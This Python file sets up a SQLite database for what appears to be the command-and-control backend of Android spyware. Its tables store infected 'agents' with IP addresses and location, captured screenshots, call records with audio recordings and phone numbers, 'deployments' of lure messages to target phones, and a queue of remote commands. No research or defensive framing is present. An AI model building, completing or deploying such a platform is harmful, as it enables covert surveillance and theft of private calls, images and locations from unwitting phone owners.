import sqlite3
import os
from datetime import datetime

class DatabaseManager:
    def __init__(self, db_path='mp_agent.db'):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialize the database with all required tables"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Agents table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT UNIQUE NOT NULL,
                phone_model TEXT,
                android_version TEXT,
                ip_address TEXT,
                status TEXT DEFAULT 'active',
                first_seen DATETIME,
                last_seen DATETIME,
                screenshot_count INTEGER DEFAULT 0,
                call_records INTEGER DEFAULT 0,
                location_data TEXT,
                battery_level INTEGER,
                last_screenshot DATETIME
            )
        ''')
        
        # Screenshots table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                screenshot_data BLOB,
                timestamp DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        # Call records table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS call_records (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                call_type TEXT,
                phone_number TEXT,
                duration INTEGER,
                audio_data BLOB,
                timestamp DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        # Deployments table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS deployments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_phone TEXT,
                agent_id TEXT,
                message_sent TEXT,
                status TEXT,
                timestamp DATETIME
            )
        ''')
        
        # System logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS system_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                level TEXT,
                message TEXT,
                timestamp DATETIME
            )
        ''')
        
        # Commands table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                command TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                timestamp DATETIME
            )
        ''')
        
        conn.commit()
        conn.close()
        print("✅ Database initialized successfully")
    
    def get_connection(self):
        """Get database connection with row factory"""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn
    
    def log_event(self, level, message):
        """Log system events"""
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
            (level, message, datetime.now())
        )
        conn.commit()
        conn.close()
    
    def get_stats(self):
        """Get platform statistics"""
        conn = self.get_connection()
        stats = {
            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
            'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
            'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0],
            'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
        }
        conn.close()
        return stats

# Initialize database
db = DatabaseManager()